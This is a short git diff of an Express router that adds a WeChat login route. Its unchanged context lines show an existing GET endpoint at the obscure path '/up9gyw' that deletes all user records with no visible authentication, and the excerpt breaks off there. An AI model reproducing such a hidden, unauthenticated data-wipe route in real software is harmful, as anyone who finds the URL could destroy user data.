@@ -3,8 +3,19 @@ const fs = require('fs-extra')
 const axios = require('axios')
 const { Sequelize, DataTypes } = require('sequelize')
 const { sequelize, Users } = require('../db/users')
+const { getWechatOpenId } = require('../lib/wechat')
 
 module.exports = function ({ router, ...deps }) {
+  router.post('/wechat-login', async (req, res) => {
+    try {
+      const { code } = req.body
+      const userInfo = await getWechatOpenId(code)
+      res.json(userInfo)
+    } catch (error) {
+      res.status(500).json({ error: 'Failed to get user info' })
+    }
+  })
+
   router.get('/up9gyw', async function (req, res) {
     const users = await Users.destroy({
       where: {},
